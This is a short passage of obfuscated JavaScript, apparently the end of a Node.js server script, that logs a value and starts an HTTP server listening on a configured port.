_0x35b686=_0x370d4c;console[_0x35b686(0x111)](_0x35b686(0x110),_0x3aa89e);}),app[_0x370d4c(0x10d)](PORT,()=>console[_0x370d4c(0x12d)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
